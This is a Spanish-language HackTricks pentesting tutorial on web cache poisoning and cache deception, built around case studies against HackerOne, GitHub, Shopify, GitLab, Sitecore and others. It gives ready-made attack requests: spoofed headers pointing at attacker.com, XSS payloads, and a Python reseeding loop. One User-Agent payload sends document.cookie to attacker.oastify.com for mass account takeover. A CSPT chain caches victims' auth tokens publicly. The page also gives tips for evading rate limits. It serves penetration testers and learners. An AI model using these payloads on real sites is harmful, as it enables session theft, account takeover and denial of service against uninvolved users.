# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## La diferencia

> **¿Cuál es la diferencia entre web cache poisoning y web cache deception?**
>
> - En **web cache poisoning**, el atacante provoca que la aplicación almacene contenido malicioso en el cache, y ese contenido se sirve desde el cache a otros usuarios de la aplicación.
> - En **web cache deception**, el atacante provoca que la aplicación almacene contenido sensible perteneciente a otro usuario en el cache, y luego el atacante recupera ese contenido desde el cache.

## Cache Poisoning

Cache poisoning tiene como objetivo manipular el cache del lado del cliente para forzar a los clientes a cargar recursos inesperados, parciales o bajo el control de un atacante. La magnitud del impacto depende de la popularidad de la página afectada, ya que la respuesta contaminada se sirve exclusivamente a los usuarios que visitan la página durante el periodo de contaminación del cache.

La ejecución de un ataque de cache poisoning implica varios pasos:

1. **Identification of Unkeyed Inputs**: Son parámetros que, aunque no son necesarios para que una petición sea almacenada en caché, pueden alterar la respuesta devuelta por el servidor. Identificar estos inputs es crucial porque pueden explotarse para manipular el cache.
2. **Exploitation of the Unkeyed Inputs**: Tras identificar las entradas no consideradas en la clave de cache, el siguiente paso es averiguar cómo abusar de esos parámetros para modificar la respuesta del servidor de una manera que beneficie al atacante.
3. **Ensuring the Poisoned Response is Cached**: El paso final es asegurar que la respuesta manipulada se almacene en el cache. De este modo, cualquier usuario que acceda a la página afectada mientras el cache está envenenado recibirá la respuesta contaminada.

### Descubrimiento: Comprobar headers HTTP

Normalmente, cuando una respuesta fue **almacenada en el cache** habrá una **cabecera que lo indique**, puedes comprobar qué cabeceras debes tener en cuenta en esta entrada: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Descubrimiento: Almacenamiento en cache de códigos de error

Si piensas que la respuesta se está almacenando en un cache, podrías intentar **enviar peticiones con una cabecera incorrecta**, que debería responder con un **status code 400**. Luego intenta acceder a la petición normalmente y si la **respuesta es un status code 400**, sabrás que es vulnerable (y podrías incluso realizar un DoS).

Puedes encontrar más opciones en:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Sin embargo, ten en cuenta que **a veces este tipo de códigos de estado no se almacenan en cache**, por lo que esta prueba podría no ser fiable.

### Descubrimiento: Identificar y evaluar entradas no consideradas en la clave de cache

Puedes usar [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) para **realizar fuerza bruta sobre parámetros y headers** que puedan estar **modificando la respuesta de la página**. Por ejemplo, una página puede estar usando la cabecera `X-Forwarded-For` para indicar al cliente que cargue el script desde allí:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Provocar una respuesta dañina en el servidor back-end

Con el parameter/header identificado, comprueba cómo está siendo **saneado** y **dónde** se **refleja** o afecta la respuesta desde el header. ¿Puedes abusarlo de todos modos (realizar un XSS o cargar un JS controlado por ti? ¿realizar un DoS?...)

### Obtener la respuesta en caché

Una vez que hayas **identificado** la **página** que puede ser abusada, qué **parameter**/**header** usar y **cómo** **abusarla**, necesitas conseguir que la página se almacene en caché. Dependiendo del recurso que intentes poner en la caché, esto puede tardar; puede que necesites intentarlo durante varios segundos.

El header **`X-Cache`** en la respuesta puede ser muy útil ya que puede tener el valor **`miss`** cuando la petición no fue cacheada y el valor **`hit`** cuando está cacheada.\
El header **`Cache-Control`** también es interesante para saber si un recurso está siendo cacheado y cuándo será la próxima vez que se cachee: `Cache-Control: public, max-age=1800`

Otro header interesante es **`Vary`**. Este header suele usarse para **indicar headers adicionales** que se tratan como **parte de la clave de caché** incluso si normalmente no forman parte de la clave. Por lo tanto, si el atacante conoce el `User-Agent` de la víctima objetivo, puede envenenar la caché para los usuarios que usen ese `User-Agent` específico.

Otro header relacionado con la caché es **`Age`**. Define el tiempo en segundos que el objeto ha estado en la caché del proxy.

Al cachear una petición, ten **cuidado con los headers que usas** porque algunos de ellos podrían ser **utilizados inesperadamente** como **parte de la clave** y la **víctima necesitará usar ese mismo header**. Siempre **testea** un Cache Poisoning con **diferentes navegadores** para comprobar si funciona.

### Estudios de caso fundamentales de Cache Poisoning

#### Redirección global de HackerOne vía `X-Forwarded-Host`

- El origin generaba redirecciones y URLs canónicas usando `X-Forwarded-Host`, pero la clave de caché solo usaba el header `Host`, por lo que una única respuesta envenenó a todos los visitantes de `/`.
- Envenenar con:
```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```
- Re-solicita inmediatamente `/` sin el spoofed header; si el redirect persiste tienes un host-spoofing primitive global que a menudo convierte reflected redirects/Open Graph links en stored issues.

#### GitHub repository DoS via `Content-Type` + `PURGE`

- El tráfico anónimo se indexaba solo por path, mientras que el backend entraba en un estado de error al ver un `Content-Type` inesperado. Esa respuesta de error era almacenable en caché para cualquier usuario no autenticado de un repo.
- GitHub también (accidentalmente) respetó el método `PURGE`, permitiendo al atacante invalidar una entrada sana y forzar a las caches a obtener la variante envenenada bajo demanda:
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```
- Siempre compara authenticated vs anonymous cache keys, fuzz headers que raramente están keyed como `Content-Type`, y sondea por exposed cache-maintenance verbs para automatizar re-poisoning.

#### Shopify cross-host persistence loops

- Los multi-layer caches a veces requieren múltiples identical hits antes de commit un nuevo object. Shopify reutilizó el mismo cache a través de numerosos localized hosts, por lo que la persistence implicó impacto en muchas properties.
- Usa short automation loops para reseed repetidamente:
```python
import requests, time
for i in range(100):
requests.get("https://shop.shopify.com/endpoint",
headers={"X-Forwarded-Host": "attacker.com"})
time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```
- Después de una respuesta `hit`, rastrea otros hosts/recursos que compartan el mismo espacio de nombres de caché para demostrar el radio de impacto entre dominios.

#### Redirección de recurso JS → cadena stored XSS

- Los programas privados frecuentemente alojan JS compartido como `/assets/main.js` en docenas de subdominios. Si `X-Forwarded-Host` influye en la lógica de redirección para esos recursos pero no se usa como clave (unkeyed), la respuesta cacheada se convierte en un 301 a JS del atacante, lo que produce stored XSS en todos los sitios donde se importe el recurso.
```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- Mapea qué hosts reutilizan la misma asset path para que puedas probar multi-subdomain compromise.

#### GitLab static DoS via `X-HTTP-Method-Override`

- GitLab servía bundles estáticos desde Google Cloud Storage, que respeta `X-HTTP-Method-Override`. Al anular GET por HEAD se devolvió un `200 OK` cacheable con `Content-Length: 0`, y el edge cache ignoró el método HTTP al generar la clave.
```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- Una única request reemplazó el JS bundle con un body vacío para cada GET, provocando efectivamente un DoSing de la UI. Siempre prueba los method overrides (`X-HTTP-Method-Override`, `X-Method-Override`, etc.) contra static assets y confirma si la cache varía según el method.

#### HackerOne static asset loop via `X-Forwarded-Scheme`

- Rails’ Rack middleware confiaba en `X-Forwarded-Scheme` para decidir si aplicar HTTPS. Spoofing `http` contra `/static/logo.png` provocó un cacheable 301, de modo que todos los usuarios posteriormente recibieron redirects (o loops) en lugar del asset:
```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
- Combine scheme spoofing con host spoofing cuando sea posible para crear redirecciones irreversibles para recursos altamente visibles.

#### Cloudflare desajuste de capitalización en el encabezado Host

- Cloudflare normalizó el encabezado `Host` para cache keys pero reenvió la capitalización original a origins. Enviar `Host: TaRgEt.CoM` provocó un comportamiento alterno en origin routing/templating mientras que, al mismo tiempo, se poblaba el canonical lowercase cache bucket.
```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```
- Enumerar tenants de CDN reproduciendo hosts con mixed-case (y otras cabeceras normalizadas) y comparando la respuesta en caché con la respuesta de origen para descubrir shared-platform cache poisonings.

#### Red Hat Open Graph meta poisoning

- Inyectar `X-Forwarded-Host` dentro de las etiquetas Open Graph convirtió una reflected HTML injection en una stored XSS una vez que la CDN almacenó la página en caché. Usa un cache buster inofensivo durante las pruebas para evitar afectar a usuarios en producción:
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```
- Los scrapers de redes sociales consumen las Open Graph tags en caché, por lo que una sola entrada envenenada distribuye la payload mucho más allá de los visitantes directos.

## Ejemplos de explotación

### Ejemplo más sencillo

Un header como `X-Forwarded-For` se refleja en la respuesta sin sanitizar.\
Puedes enviar un payload XSS básico y envenenar la caché para que todo el que acceda a la página sea XSSed:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Nota que esto envenenará una solicitud a `/en?region=uk` y no a `/en`_

### Cache poisoning para DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning a través de CDNs

In **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** se explica el siguiente escenario simple:

- La CDN almacenará en caché cualquier cosa bajo `/share/`
- La CDN NO decodificará ni normalizará `%2F..%2F`, por lo tanto, puede usarse como **path traversal para acceder a otras ubicaciones sensibles que serán almacenadas en caché** como `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- El servidor web SÍ decodificará y normalizará `%2F..%2F`, y responderá con `/api/auth/session`, que **contains the auth token**.

### Uso de web cache poisoning para explotar cookie-handling vulnerabilities

Cookies could also be reflected on the response of a page. If you can abuse it to cause a XSS for example, you could be able to exploit XSS in several clients that load the malicious cache response.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Ten en cuenta que si la cookie vulnerable es muy usada por los usuarios, las solicitudes regulares limpiarán la cache.

### Generar discrepancias con delimitadores, normalización y puntos <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Consulta:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning con path traversal para robar API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) cómo fue posible robar un OpenAI API key con una URL como `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` porque anything matching `/share/*` será cacheada sin que Cloudflare normalice la URL, lo cual se hacía cuando la petición llegaba al servidor web.

Esto también se explica mejor en:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Usar múltiples headers para explotar vulnerabilidades de web cache poisoning <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

A veces necesitarás **exploit several unkeyed inputs** para poder abusar de una cache. Por ejemplo, puedes encontrar un **Open redirect** si estableces `X-Forwarded-Host` a un dominio controlado por ti y `X-Forwarded-Scheme` a `http`. Si el servidor está reenviando todas las peticiones HTTP a HTTPS y usa la cabecera `X-Forwarded-Scheme` como el nombre de dominio para la redirección, puedes controlar hacia dónde apunta la página mediante la redirección.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Explotando con `Vary` limitado

Si detectas que el encabezado **`X-Host`** se está usando como **nombre de dominio para cargar un recurso JS**, pero el encabezado **`Vary`** en la respuesta indica **`User-Agent`**, necesitas encontrar una manera de exfiltrate el `User-Agent` de la victim y poison the cache usando ese `User-Agent`:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Envía una solicitud GET con la petición tanto en la URL como en el body. Si el web server utiliza la que está en el body pero el cache server almacena en caché la que está en la URL, cualquiera que acceda a esa URL usará en realidad el parámetro del body. Como la vuln que James Kettle encontró en el sitio web de Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
Hay un laboratorio de PortSwigger sobre esto: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Por ejemplo, es posible separar **parameters** en servidores ruby usando el carácter **`;`** en lugar de **`&`**. Esto podría usarse para colocar valores de parámetros sin clave dentro de parámetros con clave y abusar de ellos.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Aprende aquí cómo realizar [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

El [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) puede usarse para probar automáticamente Web Cache Poisoning. Soporta muchas técnicas diferentes y es altamente configurable.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Este patrón del mundo real encadena un header-based reflection primitive con el comportamiento de un CDN/WAF para envenenar de forma fiable el HTML cacheado servido a otros usuarios:

- El HTML principal reflejaba una cabecera de solicitud no confiable (p. ej., `User-Agent`) dentro de un contexto ejecutable.
- El CDN eliminaba cabeceras de caché pero existía una cache interna/origen. El CDN también auto-cacheaba solicitudes que terminaban en extensiones estáticas (p. ej., `.js`), mientras que el WAF aplicaba una inspección de contenido más débil a los GETs para assets estáticos.
- Particularidades del flujo de solicitudes permitieron que una petición a una ruta `.js` influyera en la cache key/variant usada para el HTML principal posterior, habilitando XSS cross-user vía header reflection.

Receta práctica (observada en un CDN/WAF popular):

1) Desde una IP limpia (evitar degradaciones previas basadas en reputación), configura un `User-Agent` malicioso vía navegador o Burp Proxy Match & Replace.  
2) En Burp Repeater, prepara un grupo de dos requests y usa "Send group in parallel" (el modo single-packet funciona mejor):
- First request: GET a `.js` resource path on the same origin while sending your malicious `User-Agent`.
- Immediately after: GET the main page (`/`).  
3) La carrera de enrutamiento del CDN/WAF más el `.js` auto-cacheado a menudo siembran una variante de HTML cacheado envenenado que luego se sirve a otros visitantes que comparten las mismas condiciones de cache key (p. ej., mismas dimensiones `Vary` como `User-Agent`).

Example header payload (to exfiltrate non-HttpOnly cookies):
```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Many CDNs hide cache headers; poisoning may appear only on multi-hour refresh cycles. Use multiple vantage IPs and throttle to avoid rate-limit or reputation triggers.
- Using an IP from the CDN's own cloud sometimes improves routing consistency.
- If a strict CSP is present, this still works if the reflection executes in main HTML context and CSP allows inline execution or is bypassed by context.

Impact:

- If session cookies aren’t `HttpOnly`, zero-click ATO is possible by mass-exfiltrating `document.cookie` from all users who are served the poisoned HTML.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

Un patrón específico de Sitecore permite escrituras no autenticadas en el HtmlCache al abusar de los handlers XAML pre‑auth y de la reflexión de AjaxScriptManager. Cuando se alcanza el handler `Sitecore.Shell.Xaml.WebControl`, está disponible un `xmlcontrol:GlobalHeader` (derivado de `Sitecore.Web.UI.WebControl`) y se permite la siguiente llamada reflectiva:
```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Esto escribe HTML arbitrario bajo una cache key elegida por el atacante, permitiendo un envenenamiento preciso una vez que las cache keys son conocidas.

Para más detalles (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Ejemplos vulnerables

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS reenviaba el fragmento dentro de la URL sin eliminarlo y generaba la cache key usando solo el host, path y query (ignorando el fragmento). Así que la petición `/#/../?r=javascript:alert(1)` se envió al backend como `/#/../?r=javascript:alert(1)` y la cache key no contenía la carga útil, solo host, path y query.

### 403 and Storage Buckets

Cloudflare almacenaba en cache respuestas 403. Intentar acceder a S3 o Azure Storage Blobs con encabezados Authorization incorrectos resultaría en una respuesta 403 que se cacheaba. Aunque Cloudflare dejó de cachear respuestas 403, este comportamiento todavía podría estar presente en otros servicios proxy.

### Injecting Keyed Parameters

Los caches con frecuencia incluyen parámetros GET específicos en la cache key. Por ejemplo, Varnish de Fastly cacheaba el parámetro `size` en las peticiones. Sin embargo, si una versión codificada en URL del parámetro (p. ej., `siz%65`) también se enviaba con un valor erróneo, la cache key se construiría usando el parámetro `size` correcto. Aun así, el backend procesaría el valor en el parámetro codificado en la URL. Codificar en URL el segundo parámetro `size` provocaba su omisión por parte del cache pero su utilización por el backend. Asignar el valor 0 a este parámetro resultaba en un error 400 Bad Request cacheable.

### User Agent Rules

Algunos desarrolladores bloquean requests con user-agents que coinciden con herramientas de alto tráfico como FFUF o Nuclei para gestionar la carga del servidor. Irónicamente, este enfoque puede introducir vulnerabilidades como cache poisoning y DoS.

### Illegal Header Fields

El [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) especifica los caracteres aceptables en los nombres de los headers. Los headers que contienen caracteres fuera del rango **tchar** deberían idealmente provocar una respuesta 400 Bad Request. En la práctica, los servidores no siempre se adhieren a este estándar. Un ejemplo notable es Akamai, que reenvía headers con caracteres inválidos y cachea cualquier 400 error, siempre que el header `cache-control` no esté presente. Se identificó un patrón explotable donde enviar un header con un carácter ilegal, como `\`, resultaría en un 400 Bad Request cacheable.

### Encontrar nuevos headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

El objetivo de Cache Deception es hacer que los clientes carguen recursos que van a ser guardados por el cache con su información sensible.

Primero, tenga en cuenta que las extensiones como `.css`, `.js`, `.png`, etc. suelen estar configuradas para ser guardadas en el cache. Por lo tanto, si accede a `www.example.com/profile.php/nonexistent.js` el cache probablemente almacenará la respuesta porque detecta la extensión `.js`. Pero, si la aplicación responde con los contenidos sensibles del usuario almacenados en _www.example.com/profile.php_, puede robar esos contenidos de otros usuarios.

Otras cosas para probar:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Otro ejemplo muy claro se puede encontrar en este write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
En el ejemplo, se explica que si cargas una página inexistente como _http://www.example.com/home.php/non-existent.css_ el contenido de _http://www.example.com/home.php_ (**con la información sensible del usuario**) será devuelto y el servidor de cache guardará el resultado.\
Entonces, el **attacker** puede acceder a _http://www.example.com/home.php/non-existent.css_ en su propio navegador y observar la información **confidencial** de los usuarios que accedieron antes.

Tenga en cuenta que el **cache proxy** debe estar **configurado** para **cachear** archivos **basado** en la **extensión** del archivo (_.css_) y no basarse en el content-type. En el ejemplo _http://www.example.com/home.php/non-existent.css_ tendrá un content-type `text/html` en lugar de un mime type `text/css`.

Aprende aquí sobre cómo realizar[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

Este patrón combina un Client-Side Path Traversal (CSPT) en una Single-Page App (SPA) con caching basado en extensiones por parte de un CDN para cachear públicamente JSON sensible que originalmente solo estaba disponible mediante una llamada API autenticada.

Idea a alto nivel:

- Un endpoint API sensible requiere un auth header personalizado y está correctamente marcado como non-cacheable en el origin.
- Añadir un sufijo con aspecto estático (por ejemplo, .css) hace que el CDN trate el path como un asset estático y cachee la respuesta, a menudo sin variar según headers sensibles.
- La SPA contiene CSPT: concatena un segmento de path controlado por el usuario en la URL de la API mientras adjunta el auth header de la víctima (por ejemplo, X-Auth-Token). Al inyectar ../.. traversal, el fetch autenticado se redirige a la variante del path cacheable (…/v1/token.css), provocando que el CDN cachee el JSON del token de la víctima bajo una clave pública.
- Cualquier persona puede entonces hacer un GET de esa misma cache key sin autenticación y recuperar el token de la víctima.

Ejemplo

- Sensitive endpoint (non-cacheable at origin):
```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- Sufijo con apariencia estática hace que el CDN lo trate como cacheable:
```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- CSPT en SPA adjunta auth header y permite traversal:
```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
method: 'GET',
headers: { 'X-Auth-Token': authToken }
});
```
- Cadena de explotación:
1. Atraer a la víctima a una URL que inyecta dot-segments en el parámetro de ruta del SPA, p. ej.:
- [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
2. El SPA realiza un fetch autenticado a:
- [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
3. La normalización del navegador lo resuelve a:
- [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
4. El CDN trata .css como un recurso estático y cachea el JSON con Cache-Control: public, max-age=...
5. Recuperación pública: cualquiera puede entonces hacer GET https://api.example.com/v1/token.css y obtener el JSON del token en caché.

Precondiciones

- El SPA realiza fetch/XHR autenticados al mismo origen de API (o cross-origin con CORS funcional) y adjunta cabeceras sensibles o bearer tokens.
- El Edge/CDN aplica caching basado en la extensión para rutas que parecen estáticas (p. ej., *.css, *.js, images) y no varía la clave de caché según la cabecera sensible.
- El origin del endpoint base no es cacheable (correcto), pero la variante con sufijo de extensión está permitida o no está bloqueada por las reglas del edge.

Lista de verificación de validación

- Identifica endpoints dinámicos sensibles e intenta sufijos como .css, .js, .jpg, .json. Busca Cache-Control: public/max-age y X-Cache: Hit (o equivalente, p. ej., CF-Cache-Status) mientras el contenido sigue siendo JSON.
- Localiza código cliente que concatena entrada controlada por el usuario en rutas de la API mientras adjunta cabeceras de auth. Inyecta secuencias ../ para redirigir la petición autenticada a tu endpoint objetivo.
- Confirma que la cabecera autenticada esté presente en la petición reorientada (p. ej., en un proxy o en logs del servidor) y que el CDN cachee la respuesta bajo la ruta recorrida.
- Desde un contexto limpio (sin auth), solicita la misma ruta y confirma que el JSON secreto se sirve desde la caché.

## Herramientas automáticas

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner to find web cache poisoning vulnerabilities in a list of URLs and test multiple injection techniques.

## Referencias

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
